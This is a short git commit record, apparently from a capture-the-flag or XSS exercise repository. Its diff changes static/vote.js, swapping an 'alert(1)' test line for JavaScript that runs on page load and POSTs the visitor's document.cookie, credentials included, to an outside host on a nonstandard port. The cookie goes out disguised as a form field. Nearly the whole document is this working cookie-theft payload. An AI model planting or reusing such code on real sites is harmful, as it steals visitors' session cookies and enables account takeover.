e1d952d45c8efac42dac12a3df01948aaa8aa407
P3ar9an <105878998+GaeunBae@users.noreply.github.com>
2025-08-19 16:55:01 +0900

    Update vote.js

--- static/vote.js
+++ static/vote.js
@@ -1,1 +1,10 @@
-alert(1)
+window.onload = () => {
+          fetch("http://limelight.goatskin.kr:35630/write", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/x-www-form-urlencoded",
+            },
+            credentials: "include",
+            body: "title=" + encodeURIComponent(document.cookie) + "&author=93&img=1&content=1"
+          });
+      };
